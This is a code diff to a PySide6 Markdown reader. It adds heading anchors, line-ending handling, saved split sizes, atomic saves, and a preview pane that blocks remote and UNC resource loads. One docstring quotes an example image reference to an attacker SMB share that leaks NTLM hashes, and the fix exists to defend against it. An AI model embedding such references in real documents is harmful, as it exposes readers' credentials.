@@ -2,10 +2,12 @@ from __future__ import annotations
 
 import codecs
 import contextlib
+import os
+import re
 import sys
 from pathlib import Path
 
-from PySide6.QtCore import QEvent, QFileSystemWatcher, QObject, QSettings, Qt, QTimer, QUrl
+from PySide6.QtCore import QEvent, QFileSystemWatcher, QObject, QSettings, Qt, QTimer, QUrl, Signal
 from PySide6.QtGui import (
     QAction,
     QActionGroup,
@@ -15,6 +17,7 @@ from PySide6.QtGui import (
     QIcon,
     QKeySequence,
     QShortcut,
+    QTextCursor,
     QTextDocument,
 )
 from PySide6.QtPrintSupport import QPrinter
@@ -49,6 +52,7 @@ SAFE_LINK_SCHEMES = {"http", "https", "mailto"}
 VIEW_MODES = {"split", "preview", "editor"}
 MIN_ZOOM, MAX_ZOOM = -6, 20
 RENDER_DELAY_MS = 150
+DEFAULT_SPLIT = [470, 630]
 WELCOME = """# Markdown Reader
 
 Drop a Markdown file anywhere in this window, or use **File → Open** (`Ctrl+O`).
@@ -84,7 +88,12 @@ def read_markdown(path: Path) -> tuple[str, str, str]:
         except UnicodeDecodeError:
             encoding = "latin-1"
             text = raw.decode(encoding)
-    newline = "\r\n" if "\r\n" in text else "\n"
+    if "\r\n" in text:
+        newline = "\r\n"
+    elif "\r" in text:
+        newline = "\r"  # Classic Mac line endings; keep them instead of rewriting the file.
+    else:
+        newline = "\n"
     return text.replace("\r\n", "\n").replace("\r", "\n"), encoding, newline
 
 
@@ -92,6 +101,77 @@ def encoding_label(encoding: str) -> str:
     return {"utf-8": "UTF-8", "utf-8-sig": "UTF-8 BOM", "cp1252": "Windows-1252", "latin-1": "Latin-1"}.get(
         encoding, encoding
     )
+
+
+def newline_label(newline: str) -> str:
+    return {"\r\n": "CRLF", "\r": "CR", "\n": "LF"}.get(newline, "LF")
+
+
+def heading_slug(text: str) -> str:
+    """Turn heading text into the anchor GitHub would generate for it."""
+    slug = re.sub(r"[^\w\- ]+", "", text.strip().lower(), flags=re.UNICODE)
+    return re.sub(r"\s+", "-", slug)
+
+
+def add_heading_anchors(document: QTextDocument) -> None:
+    """Give every heading an anchor name so in-document "#heading" links can jump to it.
+
+    Qt renders Markdown without heading anchors, so a table of contents built from
+    [Section](#section) links silently did nothing.
+    """
+    seen: dict[str, int] = {}
+    block = document.begin()
+    while block.isValid():
+        if block.blockFormat().headingLevel():
+            slug = heading_slug(block.text())
+            if slug:
+                count = seen.get(slug, 0)
+                seen[slug] = count + 1
+                names = [slug if count == 0 else f"{slug}-{count}"]
+                cursor = QTextCursor(block)
+                cursor.movePosition(QTextCursor.MoveOperation.EndOfBlock, QTextCursor.MoveMode.KeepAnchor)
+                fmt = cursor.charFormat()
+                fmt.setAnchor(True)
+                fmt.setAnchorNames(names)
+                cursor.mergeCharFormat(fmt)
+        block = block.next()
+
+
+class PreviewBrowser(QTextBrowser):
+    """Preview pane that refuses to fetch anything off the machine.
+
+    Qt resolves image paths on its own, so a Markdown file containing
+    ``![](//attacker/share/pixel.png)`` made Windows open an SMB connection to
+    that host and offer the current user's NTLM credentials - a tracking pixel
+    that leaks a password hash, triggered just by previewing an untrusted file.
+    Only plain local paths are loaded now; UNC and network references are
+    dropped, and each one reports itself so the status bar can say so.
+    """
+
+    resource_blocked = Signal()
+
+    def __init__(self, parent: QWidget | None = None) -> None:
+        super().__init__(parent)
+        self.blocked_resources = 0
+
+    def loadResource(self, resource_type: int, name: QUrl):  # noqa: N802
+        if self._is_allowed(name):
+            return super().loadResource(resource_type, name)
+        self.blocked_resources += 1
+        self.resource_blocked.emit()
+        return None
+
+    @staticmethod
+    def _is_allowed(name: QUrl) -> bool:
+        if name.isEmpty() or name.scheme() == "data":
+            return True
+        if name.host():
+            # A host means a UNC path (file://server/share) or a remote URL.
+            return False
+        if name.scheme() and not name.isLocalFile():
+            return False
+        local = name.toLocalFile() if name.isLocalFile() else name.path()
+        return not local.startswith(("//", "\\\\"))
 
 
 class MarkdownWindow(QMainWindow):
@@ -108,6 +188,8 @@ class MarkdownWindow(QMainWindow):
         self._zoom = 0
         self._updating_editor = False
         self._reload_prompt_open = False
+        self._word_count = 0
+        self._split_sizes = self._stored_split_sizes()
 
         self._render_timer = QTimer(self)
         self._render_timer.setSingleShot(True)
@@ -147,12 +229,14 @@ class MarkdownWindow(QMainWindow):
         self.editor.textChanged.connect(self._on_text_changed)
         self.editor.cursorPositionChanged.connect(self._update_position)
 
-        self.preview = QTextBrowser()
+        self.preview = PreviewBrowser()
         # QTextBrowser also accepts drops by default; let the main window handle
         # them so dropping works across both panes.
         self.preview.setAcceptDrops(False)
         self.preview.setOpenLinks(False)
         self.preview.anchorClicked.connect(self._open_link)
+        # Images are fetched during layout, after _render returns, so let the pane say so.
+        self.preview.resource_blocked.connect(self._report_blocked_resources)
         self.preview.document().setDefaultStyleSheet(PREVIEW_CSS)
 
         # Ctrl+wheel would otherwise zoom one pane on its own and bypass the zoom level.
@@ -161,7 +245,8 @@ class MarkdownWindow(QMainWindow):
 
         self.splitter.addWidget(self.editor)
         self.splitter.addWidget(self.preview)
-        self.splitter.setSizes([470, 630])
+        self.splitter.setSizes(self._split_sizes)
+        self.splitter.splitterMoved.connect(self._remember_split)
         layout.addWidget(self.splitter, 1)
 
         self.find_bar = QWidget()
@@ -285,6 +370,19 @@ class MarkdownWindow(QMainWindow):
         toolbar.addSeparator()
         toolbar.addActions([self.zoom_out_action, self.zoom_in_action, self.zoom_reset_action])
 
+    def _stored_split_sizes(self) -> list[int]:
+        stored = self.settings.value("splitSizes")
+        with contextlib.suppress(TypeError, ValueError):
+            sizes = [int(size) for size in stored or []]
+            if len(sizes) == 2 and all(size >= 0 for size in sizes) and sum(sizes) > 0:
+                return sizes
+        return list(DEFAULT_SPLIT)
+
+    def _remember_split(self, *_args) -> None:
+        # Only meaningful while both panes are visible; a hidden pane reports 0.
+        if self.view_mode == "split":
+            self._split_sizes = self.splitter.sizes()
+
     def _restore_settings(self) -> None:
         geometry = self.settings.value("geometry")
         if geometry:
@@ -318,9 +416,19 @@ class MarkdownWindow(QMainWindow):
             document.setBaseUrl(QUrl.fromLocalFile(str(self.current_path.parent) + "/"))
         else:
             document.setBaseUrl(QUrl())
+        self.preview.blocked_resources = 0
         document.setMarkdown(text, QTextDocument.MarkdownDialectGitHub)
+        add_heading_anchors(document)
         # Re-rendering resets the preview to the top; keep the reader's place while typing.
         bar.setValue(scroll if keep_scroll else 0)
+        self._word_count = len(text.split())
+
+    def _report_blocked_resources(self) -> None:
+        blocked = self.preview.blocked_resources
+        if blocked:
+            self.statusBar().showMessage(
+                f"Blocked {blocked} off-machine reference{'s' if blocked > 1 else ''} in this document", 8000
+            )
 
     def _render_editor(self) -> None:
         self._render_timer.stop()
@@ -342,11 +450,12 @@ class MarkdownWindow(QMainWindow):
 
     def _update_position(self) -> None:
         cursor = self.editor.textCursor()
-        words = len(self.editor.toPlainText().split())
-        line_ending = "CRLF" if self.newline == "\r\n" else "LF"
+        # The word count comes from the last render; counting the whole document on
+        # every cursor move made arrow keys crawl in large files.
         self.position_label.setText(
             f"Ln {cursor.blockNumber() + 1}, Col {cursor.positionInBlock() + 1}   ·   "
-            f"{words:,} words   ·   {encoding_label(self.encoding)}   ·   {line_ending}  "
+            f"{self._word_count:,} words   ·   {encoding_label(self.encoding)}   ·   "
+            f"{newline_label(self.newline)}  "
         )
 
     def _dialog_directory(self) -> Path:
@@ -426,15 +535,25 @@ class MarkdownWindow(QMainWindow):
     def _write_to(self, path: Path) -> bool:
         text = self.editor.toPlainText()
         note = ""
+        # Write a sibling temp file and swap it in, so a save that fails halfway
+        # (full disk, lost network share) leaves the original file intact.
+        temp = path.with_name(f".{path.name}.saving")
+        # QFileSystemWatcher keeps a handle on the watched file, and on Windows that
+        # makes the swap fail with "access is denied"; stop watching until it is done.
+        self._watch(None)
         try:
             try:
-                path.write_text(text, encoding=self.encoding, newline=self.newline)
+                temp.write_text(text, encoding=self.encoding, newline=self.newline)
             except UnicodeEncodeError:
                 # The user typed characters the original legacy encoding cannot hold.
                 note = f" (converted from {encoding_label(self.encoding)} to UTF-8)"
                 self.encoding = "utf-8"
-                path.write_text(text, encoding=self.encoding, newline=self.newline)
+                temp.write_text(text, encoding=self.encoding, newline=self.newline)
+            os.replace(temp, path)
         except OSError as exc:
+            with contextlib.suppress(OSError):
+                temp.unlink(missing_ok=True)
+            self._watch(self.current_path)
             QMessageBox.critical(self, APP_NAME, f"Could not save the file:\n{exc}")
             return False
         self.current_path = path.resolve()
@@ -544,7 +663,8 @@ class MarkdownWindow(QMainWindow):
         self.preview_action.setChecked(mode == "preview")
         self.edit_action.setChecked(mode == "editor")
         if mode == "split":
-            self.splitter.setSizes([470, 630])
+            # Restore where the reader left the divider instead of resetting it.
+            self.splitter.setSizes(self._split_sizes)
         self.statusBar().showMessage(f"{mode.title()} view", 2000)
 
     def zoom_in(self) -> None:
@@ -733,6 +853,8 @@ class MarkdownWindow(QMainWindow):
         self.settings.setValue("windowState", self.saveState())
         self.settings.setValue("viewMode", self.view_mode)
         self.settings.setValue("zoom", self._zoom)
+        self._remember_split()
+        self.settings.setValue("splitSizes", [str(size) for size in self._split_sizes])
         event.accept()
 
 
